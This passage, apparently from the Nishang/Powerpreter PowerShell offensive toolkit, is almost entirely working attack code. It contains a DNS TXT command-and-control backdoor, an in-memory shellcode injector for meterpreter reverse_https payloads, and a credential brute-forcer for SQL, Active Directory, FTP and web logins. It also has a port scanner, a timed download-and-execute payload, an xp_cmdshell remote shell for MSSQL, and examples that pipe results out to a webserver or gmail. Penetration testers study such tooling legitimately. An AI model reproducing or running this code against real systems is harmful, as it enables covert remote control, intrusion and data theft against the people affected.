            if ($vb -match "vbox")
                {
                        $vbvm = $true
                }
        }
  

    if (!$vbvm)
        {
            $vb = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
            if (($vb -match "VBoxMouse") -or ($vb -match "VBoxGuest") -or ($vb -match "VBoxService") -or ($vb -match "VBoxSF"))
                {
                    $vbvm = $true
                }
        }

    if ($vbvm)
        {
    
        "This is a Virtual Box."
    
        }



    #Xen

    $xen = Get-Process

    if ($xen -eq "xenservice.exe")
        {
    
        $xenvm = $true
    
        }
    
    if (!$xenvm)
        {
            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
            if ($xen -match "xen")
                {
                    $xenvm = $true
                }
        }

    if (!$xenvm)
        {
            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\DSDT
            if ($xen -match "xen")
                {
                    $xenvm = $true
                }
        }
    
    if (!$xenvm)
        {
            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
            if ($xen -match "xen")
                {
                    $xenvm = $true
                }
        }

    
    if (!$xenvm)
        {
            $xen = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
            if (($xen -match "xenevtchn") -or ($xen -match "xennet") -or ($xen -match "xennet6") -or ($xen -match "xensvc") -or ($xen -match "xenvdb"))
                {
                    $xenvm = $true
                }
        }


    if ($xenvm)
        {
    
        "This is a Xen Machine."
    
        }


    #QEMU

    $qemu = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
    if ($qemu -match "qemu")
        {
    
            $qemuvm = $true
    
        }
    
    if (!$qemuvm)
        {
        $qemu = Get-ItemProperty hklm:HARDWARE\DESCRIPTION\System\CentralProcessor\0 -Name ProcessorNameString
        if ($qemu -match "qemu")
            {
                $qemuvm = $true
            }
        }    

    if ($qemuvm)
        {
    
        "This is a Qemu machine."
    
        }
    
}


#####################Acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.#####################
function DNS_TXT_Pwnage
{

<#
.SYNOPSIS
A backdoor capable of recieving commands and PowerShell scripts from DNS TXT queries.

.DESCRIPTION
This script continuously queries a domain's TXT records. It could be sent commands and powershell scripts using the TXT records which are executed on the target machine.
The PowerShell script which would be served as TXT record must be generated using Out-DnsTxt.ps1 in the Utility folder.

While using the AuthNS option it should be kept in mind that it increases chances of detection.
Leaving the DNS resolution to authorised name server of a target environment may be more desirable.

If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility folder to decode the exfiltrated data.

.PARAMETER startdomain
The domain (or subdomain) whose TXT records would be checked regularly for further instructions.

.PARAMETER cmdstring
 The string, if responded by TXT record of startdomain, will make the payload  query "commanddomain" for commands.
 
.PARAMETER commanddomain
The domain (or subdomain) whose TXT records would be used to issue commands to the payload.

.PARAMETER psstring
 The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for encoded powershell script. 

.PARAMETER psdomain
The domain (or subdomain) whose subdomains would be used to provide powershell scripts from TXT records.

.PARAMETER Arguments
Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.

.PARAMETER subdomains
The number of subdomains which would be used to provide powershell scripts from their TXT records.
The length of DNS TXT records is assumed to be 255 characters, so more than one subdomains would be required.

.PARAMETER stopstring
The string, if responded by TXT record of startdomain, will stop this payload on the target.

.PARAMETER AuthNS
Authoritative Name Server for the domains (or for startdomain in case you are using separate domains). 
Startdomain would be changed for commands and an authoritative reply shoudl reflect changes immediately.


.EXAMPLE
PS > DNS_TXT_Pwnage
The payload will ask for all required options.

.EXAMPLE
PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com
In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
you want to execute. The TXT record could be changed live and the payload will pick up updated 
record to execute new command.

To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
1.script.alteredsecurity.com, 2.script.alteredsecurity.com and 3.script.alteredsecurity.com looking for a base64encoded powershell script. 
Use the Arguments paramter if the downloaded script loads a function.
Use the Out-DnsTxt script in the Utility folder to encode scripts to base64.

.EXAMPLE
PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
Use above command for sending POST request to your webserver which is able to log the requests.

.LINK
http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding(DefaultParameterSetName="noexfil")] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $startdomain,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $cmdstring,

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $commanddomain,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $psstring,

        [Parameter(Position = 4, Mandatory = $True)]
        [String]
        $psdomain,

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $Arguments = "Out-Null",

        [Parameter(Position = 6, Mandatory = $True)]
        [String]
        $Subdomains,

        [Parameter(Position = 7, Mandatory = $True)]

        [String]
        $StopString,

        [Parameter(Position = 8, Mandatory = $True)]
        [String]$AuthNS,


        [Parameter()]
        [Switch]
        $NoLoadFunction
        
    )    

    while($true)
    {
        $exec = 0
        start-sleep -seconds 5
        if ($AuthNS -ne $null)
        {
            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
        }
        else
        {
            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
        }
        $tmp = $getcode | select-string -pattern "`""
        $startcode = $tmp -split("`"")[0]
        if ($startcode[1] -eq $cmdstring)
        {
            start-sleep -seconds 5
            if ($AuthNS -ne $null)
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
            }
            else
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
            }
            $temp = $getcommand | select-string -pattern "`""
            $command = $temp -split("`"")[0]
            $pastevalue = Invoke-Expression $command[1]
            $pastevalue
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }

        if ($startcode[1] -match $psstring)
        {
                      
            $i = 1
            while ($i -le $subdomains)
            {
                if ($AuthNS -ne $null)
                {
                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain $AuthNS")
                }
                else
                {
                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain") 
                }
                $temp = $getcommand | select-string -pattern "`""
                $tmp1 = ""
                $tmp1 = $tmp1 + $temp
                $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
                $i++
            }
            #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
            $dec = [System.Convert]::FromBase64String($encdata)
            $ms = New-Object System.IO.MemoryStream
            $ms.Write($dec, 0, $dec.Length)
            $ms.Seek(0,0) | Out-Null
            $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
            $sr = New-Object System.IO.StreamReader($cs)
            $command = $sr.readtoend()
            $pastevalue = Invoke-Expression $command

            # Check for arguments to the downloaded script.
            if ($Arguments -ne "Out-Null")
            {
                $pastevalue = Invoke-Expression $Arguments                   
            }

            $pastevalue            
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }

        }
        
        if($startcode[1] -eq $StopString)
        {
            break
        }
    }
}

#####################Execute shellcode in-memory. The shellcode is recieved from DNS TXT queries.#####################

function Execute-DNSTXT-Code
{


<#
.SYNOPSIS
Payload which could execute shellcode from DNS TXT queries.

.DESCRIPTION
This payload is able to pull shellcode from txt record of a domain. 
Below commands could be used to generate shellcode to be usable with this script
./msfvenom -p windows/meterpreter/reverse_https -f powershell LHOST=<>
./msfvenom -p windows/x64/meterpreter/reverse_https -f powershell LHOST=<>

To generate TXT records from above shellcode, use Out-DnsTxt.ps1 in the Utility folder.

.PARAMETER shellcode32
The domain (or subdomain) whose subbdomain's TXT records would hold 32-bit shellcode.

.PARAMETER shellcode64
The domain (or subdomain) whose subbdomain's TXT records would hold 64-bit shellcode.

 .PARAMETER AUTHNS
Authoritative Name Server for the domains.

.PARAMETER subdomains
The number of subdomains which would be used to provide shellcode from their TXT records.


.EXAMPLE
PS > Execute-DNSTXT-Code
The payload will ask for all required options.

.EXAMPLE
PS > Execute-DNSTXT-Code 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com -SubDomains 5
Use above from non-interactive shell.

.LINK
http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
https://github.com/samratashok/nishang

.NOTES
The code execution logic is based on this post by Matt.
http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
#>
    
    
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ShellCode32,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $ShellCode64,

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $AuthNS,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $Subdomains

    )
    
    #Function to get shellcode from TXT records
    function Get-ShellCode
    {
        Param(
            [Parameter()]
            [String]
            $ShellCode
        )
        $i = 1
        while ($i -le $subdomains)
        {
            if ($AuthNS -ne $null)
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode $AuthNS") 
            }
            else
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode") 
            }
            $temp = $getcommand | select-string -pattern "`""
            $tmp1 = ""
            $tmp1 = $tmp1 + $temp
            $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
            $i++
        }
        #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
        $dec = [System.Convert]::FromBase64String($encdata)
        $ms = New-Object System.IO.MemoryStream
        $ms.Write($dec, 0, $dec.Length)
        $ms.Seek(0,0) | Out-Null
        $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
        $sr = New-Object System.IO.StreamReader($cs)
        $sc = $sr.readtoend()
        return $sc
    }
    if ([IntPtr]::Size -eq 8) 
    {
        $Shell64 = (Get-ShellCode $ShellCode64)
        #Remove unrequired things from msf shellcode
        $tmp = $Shell64 -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " "
        [Byte[]]$sc = $tmp -split ','
    } 
    else
    {
        $shell32 = (Get-ShellCode $ShellCode32)
        $tmp = $Shell32 -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " "
        [Byte[]]$sc = $tmp -split ','
    }

    #Code Execution logic
    $code = @' 
    [DllImport("kernel32.dll")] 
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 
    [DllImport("kernel32.dll")] 
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
    [DllImport("msvcrt.dll")] 
    public static extern IntPtr memset(IntPtr dest, uint src, uint count); 
'@ 
    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru 
    $size = 0x1000 
    if ($sc.Length -gt 0x1000) {$size = $sc.Length} 
    $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) 
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} 
    $winFunc::CreateThread(0,0,$x,0,0,0) 
    while($True)
    {
        start-sleep -Seconds 100
    }
}


###############################################convert an executable to text file.#######################################################
function ExetoText
{
<#
.SYNOPSIS
Nishang script to convert an executable to text file.

.DESCRIPTION
This script converts and an executable to a text file.

.PARAMETER EXE
The path of the executable to be converted.

.PARAMETER FileName
Path of the text file to which executable will be converted.

.EXAMPLE
PS > ExetoText C:\binaries\evil.exe C:\test\evil.txt

.LINK
http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $EXE, 
        
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Filename
    )
    [byte[]] $hexdump = get-content -encoding byte -path "$EXE"
    [System.IO.File]::WriteAllLines($Filename, ([string]$hexdump))
    Write-Output "Converted file written to $Filename"
}



################################Performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.###########################
####Thanks Niklas Goude#####
###http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
function Brute-Force {

<#
.SYNOPSIS
Payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.

.DESCRIPTION
This payload tries to login to SQL, ActiveDirectory, Web or FTP using a specific account and password.
You can also specify a password-list as input as shown in the Example section.

.PARAMETER Identity
Specifies a SQL Server, FTP Site or Web Site.

.PARAMETER UserName
Specifies a UserName. If blank, trusted connection will be used for SQL and anonymous access will be used for FTP.

.PARAMETER Password
Specifies a Password.

.PARAMETER Service
Enter a Service. Default service is set to SQL.

.EXAMPLE
PS> Brute-Force -Identity SRV01 -UserName sa -Password ""

.EXAMPLE
PS> Brute-Force -Identity ftp://SRV01 -UserName sa -Password "" -Service FTP

.EXAMPLE
PS> "SRV01","SRV02","SRV03" | Brute-Force -UserName sa -Password sa

.EXAMPLE
PS> Brute-Force -Identity "domain.local" -UserName administrator -Password Password1 -Service ActiveDirectory

.EXAMPLE
PS> Brute-Force -Identity "http://www.something.com" -UserName user001 -Password Password1 -Service Web

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
https://github.com/samratashok/nishang

.NOTES
Goude 2012, TreuSec
#>

  Param(
    [Parameter(Mandatory = $true,
      Position = 0,
      ValueFromPipeLineByPropertyName = $true)]
    [Alias("PSComputerName","CN","MachineName","IP","IPAddress","ComputerName","Url","Ftp","Domain","DistinguishedName")]
    [string]$Identity,

    [parameter(Position = 1,
      ValueFromPipeLineByPropertyName = $true)]
    [string]$UserName,

    [parameter(Position = 2,
      ValueFromPipeLineByPropertyName = $true)]
    [string]$Password,

    [parameter(Position = 3)]
    [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
    [string]$Service = "SQL"
  )
  
  Process {
    if($service -eq "SQL") {
      $Connection = New-Object System.Data.SQLClient.SQLConnection
      if($userName) {
        $Connection.ConnectionString = "Data Source=$identity;Initial Catalog=Master;User Id=$userName;Password=$password;"
      } else {
        $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
      }
      Try {
        $Connection.Open()
        $success = $true
      }
      Catch {
        $success = $false
      }
      if($success -eq $true) {
        $message = switch($connection.ServerVersion) {
          { $_ -match "^6" } { "SQL Server 6.5";Break }
          { $_ -match "^6" } { "SQL Server 7";Break }
          { $_ -match "^8" } { "SQL Server 2000";Break }
          { $_ -match "^9" } { "SQL Server 2005";Break }
          { $_ -match "^10\.00" } { "SQL Server 2008";Break }
          { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break }
          Default { "Unknown" }
        }
      } else {
        $message = "Unknown"
      }
    } elseif($service -eq "FTP") {
      if($identity -notMatch "^ftp://") {
        $source = "ftp://" + $identity
      } else {
        $source = $identity
      }
      try {
        $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
        $result = $ftpRequest.GetResponse()
        $message = $result.BannerMessage + $result.WelcomeMessage
        $success = $true
      } catch {
        $message = $error[0].ToString()
        $success = $false
      }
    } elseif($service -eq "ActiveDirectory") {
      Add-Type -AssemblyName System.DirectoryServices.AccountManagement
      $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
      Try {
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $identity)
        $success = $true
      }
      Catch {
        $message = "Unable to contact Domain"
        $success = $false
      }
      if($success -ne $false) {
        Try {
          $success = $principalContext.ValidateCredentials($username, $password)
          $message = "Password Match"
        }
        Catch {
          $success = $false
          $message = "Password doesn't match"
        }
      }
    } elseif($service -eq "Web") {
      if($identity -notMatch "^(http|https)://") {
        $source = "http://" + $identity
      } else {
        $source = $identity
      }
      $webClient = New-Object Net.WebClient
      $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
      $webClient.Credentials = $credential
      Try {
        $message = $webClient.DownloadString($source)
        $success = $true
      }
      Catch {
        $success = $false
        $message = "Password doesn't match"
      }
    }
    # Return Object
    New-Object PSObject -Property @{
      ComputerName = $identity;
      UserName = $username;
      Password = $Password;
      Success = $success;
      Message = $message
    } | Select-Object Success, Message, UserName, Password, ComputerName
  }
}


#########################################Scan IP-Addresses, Ports and HostNames############################################################
####Thanks Niklas Goude#####
function Port-Scan {

<#
.SYNOPSIS
Nihsang payload which Scan IP-Addresses, Ports and HostNames

.DESCRIPTION
Scan for IP-Addresses, HostNames and open Ports in your Network.
    
.PARAMETER StartAddress
StartAddress Range

.PARAMETER EndAddress
EndAddress Range

.PARAMETER ResolveHost
Resolve HostName

.PARAMETER ScanPort
Perform a PortScan

.PARAMETER Ports
Ports That should be scanned, default values are: 21,22,23,53,69,71,80,98,110,139,111,
389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,
5801,5900,5555,5901

.PARAMETER TimeOut
Time (in MilliSeconds) before TimeOut, Default set to 100

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -TimeOut 500

.EXAMPLE
Port-Scan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/02/use-powershell-for-network-host-and-port-discovery-sweeps.aspx
https://github.com/samratashok/nishang
    
.NOTES
Goude 2012, TrueSec
#>


[CmdletBinding()] Param(
    [parameter(Mandatory = $true,
      Position = 0)]
    [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
    [string]$StartAddress,
    [parameter(Mandatory = $true,
      Position = 1)]
    [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
    [string]$EndAddress,
    [switch]$ResolveHost,
    [switch]$ScanPort,
    [int[]]$Ports = @(21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901),
    [int]$TimeOut = 100
  )
  
  Begin {
    $ping = New-Object System.Net.Networkinformation.Ping
  }
  Process {
    foreach($a in ($StartAddress.Split(".")[0]..$EndAddress.Split(".")[0])) {
      foreach($b in ($StartAddress.Split(".")[1]..$EndAddress.Split(".")[1])) {
        foreach($c in ($StartAddress.Split(".")[2]..$EndAddress.Split(".")[2])) {
          foreach($d in ($StartAddress.Split(".")[3]..$EndAddress.Split(".")[3])) {
            write-progress -activity PingSweep -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100)
            $pingStatus = $ping.Send("$a.$b.$c.$d",$TimeOut)
            if($pingStatus.Status -eq "Success") {
              if($ResolveHost) {
                write-progress -activity ResolveHost -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100) -Id 1
                $getHostEntry = [Net.DNS]::BeginGetHostEntry($pingStatus.Address, $null, $null)
              }
              if($ScanPort) {
                $openPorts = @()
                for($i = 1; $i -le $ports.Count;$i++) {
                  $port = $Ports[($i-1)]
                  write-progress -activity PortScan -status "$a.$b.$c.$d" -percentcomplete (($i/($Ports.Count)) * 100) -Id 2
                  $client = New-Object System.Net.Sockets.TcpClient
                  $beginConnect = $client.BeginConnect($pingStatus.Address,$port,$null,$null)
                  if($client.Connected) {
                    $openPorts += $port
                  } else {
                    # Wait
                    Start-Sleep -Milli $TimeOut
                    if($client.Connected) {
                      $openPorts += $port
                    }
                  }
                  $client.Close()
                }
              }
              if($ResolveHost) {
                $hostName = ([Net.DNS]::EndGetHostEntry([IAsyncResult]$getHostEntry)).HostName
              }
              # Return Object
              New-Object PSObject -Property @{
                IPAddress = "$a.$b.$c.$d";
                HostName = $hostName;
                Ports = $openPorts
              } | Select-Object IPAddress, HostName, Ports
            }
          }
        }
      }
    }
  }
  End {
  }
}

############################################################Convert a plain string to Base64 encoding.####################################
function StringtoBase64
{


<#
.SYNOPSIS
Helper function which encodes a string to base64 string.

.DESCRIPTION
This payload encodes the given string to base64 string and writes it to base64encoded.txt in current directory.
.PARAMETER Str
The string to be encoded

.PARAMETER OutputFile
The path of the output file. Default is "encoded.txt" in the current working directory.

.PARAMETER IsString
Use this to specify if you are passing a string ins place of a filepath.

.EXAMPLE
PS > StringToBase64 "start-process calc.exe" -IsString

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] 
        Param( [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Str,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $outputfile=".\base64encoded.txt", 

        [Switch]
        $IsString
    )

   if($IsString -eq $true)
    {
    
        $utfbytes  = [System.Text.Encoding]::Unicode.GetBytes($Str)
       
    }
  else
    {
        $utfbytes  = [System.Text.Encoding]::Unicode.GetBytes((Get-Content $Str))
    }

  $base64string = [System.Convert]::ToBase64String($utfbytes)
  Out-File -InputObject $base64string -Encoding ascii -FilePath "$outputfile"
  Write-Output "Encoded data written to file $outputfile"
}




####################################Convert an executable file in hex format to executable (.exe)########################################

function TexttoEXE
{

<#
.SYNOPSIS
Function to convert a PE file in hex format to executable

.DESCRIPTION
This function converts a PE file in hex to executable and writes it to user temp.

.PARAMETER Filename
Path of the hex text file from which  executable will be created.

.PARAMETER EXE
Path where the executable should be created.

.EXAMPLE
PS > TexttoExe C:\evil.text C:\exe\evil.exe

.LINK
http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $FileName,
    
        [Parameter(Position = 1, Mandatory = $True)]
        [String]$EXE
    )
    
    [String]$hexdump = get-content -path "$Filename"
    [Byte[]] $temp = $hexdump -split ' '
    [System.IO.File]::WriteAllBytes($EXE, $temp)
    Write-Output "Executable written to file $EXE"
}



#############################################Waits till given time to execute a script.####################################################
function Execute-OnTime
{

<#
.SYNOPSIS
Payload which waits till given time to execute a script.

.DESCRIPTION
This payload waits till the given time (on the victim) and then downloads a PowerShell script and executes it.

.PARAMETER PAYLOADURL
The URL from where the file would be downloaded.

.PARAMETER Arguments
Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.

.PARAMETER time
The Time when the payload will be executed (in 24 hour format e.g. 23:21).

.PARAMETER CheckURL
The URL which the payload would check for instructions to stop.

.PARAMETER StopString
The string which if found at CheckURL will stop the payload.

.EXAMPLE
PS > Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload

EXAMPLE
PS > Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload | Do-Exfiltration -ExfilOption gmail -username <> -Password <>

Use above command for data exfiltration to gmail


.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>



    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $PayloadURL,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Arguments = "Out-Null",


        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $time,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $CheckURL,

        [Parameter(Position = 4, Mandatory = $True)]
        [String]
        $StopString

    )

    

    while($true)
    {
        $exec = 0
        start-sleep -seconds 5 
        $webclient = New-Object System.Net.WebClient
        $filecontent = $webclient.DownloadString("$CheckURL")
        $systime = Get-Date -UFormat %R
        if ($systime -match $time)
        {
            $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
            # Check for arguments to the downloaded script.
            if ($Arguments -ne "Out-Null")
            {
                $pastevalue = Invoke-Expression $Arguments                   
            }
            $pastevalue
            $exec++
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }
        elseif ($filecontent -eq $StopString)
        {
            break
        }
    }
}



####################################################Execute commands remotely on a MS SQL server.##############################################
function Execute-Command-MSSQL
{

<#
.SYNOPSIS
Payload which could be used to execute commands remotely on a MS SQL server.

.DESCRIPTION
This payload needs a valid administrator username and password on remote SQL server.
It uses the credentials to enable xp_cmdshell and provides a powershell shell, a sql shell
or a cmd shell on the target.

.PARAMETER ComputerName
Enter CopmuterName or IP Address of the target SQL server.

.PARAMETER UserName
Enter a UserName for a SQL server administrator account.

.PARAMETER Password
Enter the Password for the account.

.EXAMPLE
Execute-Command-MSSQL -ComputerName sqlserv01 -UserName sa -Password sa1234

.EXAMPLE
Execute-Command-MSSQL -ComputerName 192.168.1.10 -UserName sa -Password sa1234

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang

.NOTES
Based mostly on the Get-TSSqlSysLogin by Niklas Goude and accompanying blog post at 
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
http://www.truesec.com

#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
        [Alias("PSComputerName","CN","MachineName","IP","IPAddress")]
        [string]
        $ComputerName,

        [parameter(Mandatory = $true, Position = 1)]
        [string]
        $UserName,
    
        [parameter(Mandatory = $true, Position = 2)]
        [string]
        $Password
    )
Try{
    function Make-Connection ($query){
 
    $Connection = New-Object System.Data.SQLClient.SQLConnection
    $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
    $Connection.Open()
    $Command = New-Object System.Data.SQLClient.SQLCommand
    $Command.Connection = $Connection
    $Command.CommandText = $query
    $Reader = $Command.ExecuteReader()
    $Connection.Close()

    }
  
    "Connecting to $ComputerName..." 
	start-sleep 3 
    Make-Connection "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
    "`nEnabling XP_CMDSHELL...`n"
    start-sleep 3
    Make-Connection "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
    write-host -NoNewline "Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): "
    $shell = read-host
    while($payload -ne "exit")
    {
        $Connection = New-Object System.Data.SQLClient.SQLConnection
        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
        $Connection.Open()
        $Command = New-Object System.Data.SQLClient.SQLCommand
        $Command.Connection = $Connection
        if ($shell -eq "P")
        {
            write-host "`n`nStarting PowerShell on the target..`n"
            write-host -NoNewline "PS $ComputerName> "
            $payload = read-host
            $cmd = "EXEC xp_cmdshell 'powershell.exe -Command `"& {$payload}`"'"
        }
        elseif ($shell -eq "S")
        {
            write-host "`n`nStarting SQL shell on the target..`n"
            write-host -NoNewline "MSSQL $ComputerName> "
            $payload = read-host
            $cmd = $payload
        }
        elseif ($shell -eq "C")
        {
            write-host "`n`nStarting cmd shell on the target..`n"
            write-host -NoNewline "CMD $ComputerName> "
            $payload = read-host
            $cmd = "EXEC xp_cmdshell 'cmd.exe /K $payload'"
        }
            
            
        $Command.CommandText = "$cmd"
        $Reader = $Command.ExecuteReader()
        while ($reader.Read()) {
            New-Object PSObject -Property @{
            Name = $reader.GetValue(0)
            }
        }
        $Connection.Close()
    }
    }
    Catch {
      $error[0]
    }
}


function HTTP-Backdoor
{

<#
.SYNOPSIS
Payload which queries a URL for instructions and then downloads and executes a powershell script.

.DESCRIPTION
This payload queries the given URL and after a suitable command (given by MagicString variable) is found, 
it downloads and executes a powershell script. The payload could be stopped remotely if the string at CheckURL matches
the string given in StopString variable.

.PARAMETER CheckURL
